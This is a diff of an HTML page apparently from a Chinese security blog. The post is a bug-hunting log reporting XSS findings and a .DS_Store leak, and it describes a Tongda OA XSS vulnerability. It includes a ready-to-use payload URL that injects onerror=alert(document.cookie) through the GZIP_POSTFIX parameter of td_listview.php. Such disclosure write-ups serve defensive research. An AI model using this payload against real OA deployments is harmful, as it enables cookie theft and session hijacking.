@@ -48,10 +48,7 @@
   </header>
 
   <div class="post-content">
-    <blockquote>
-<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/18543859">https://www.cnblogs.com/Zephyr07/articles/18543859</a></p>
-</blockquote>
-<p><strong>今日edu收获为0，仅收获两xss和一个ds_store文件泄露（不知道收不收）</strong></p>
+    <p><strong>今日edu收获为0，仅收获两xss和一个ds_store文件泄露（不知道收不收）</strong></p>
 <h1 id="1-通达oa-xss漏洞"><a href="#1-通达oa-xss漏洞" class="headerlink" title="1.通达oa xss漏洞"></a>1.通达oa xss漏洞</h1><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>个人感觉应该是白盒审计出来的吧，应该不是黑盒测试吧，js也没找到该目录泄露<br>序列 onerror&#x3D;alert(document.cookie) 尝试注入一个JavaScript事件处理器 onerror，如果在浏览器中执行，它会触发一个警告框来显示 document.cookie 的内容</p>
 <h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylod：/module/html_editor/editor/plugins/td_listview/td_listview.php?GZIP_POSTFIX=%22+onerror=alert(document.cookie)+a=1</span><br></pre></td></tr></table></figure>
 
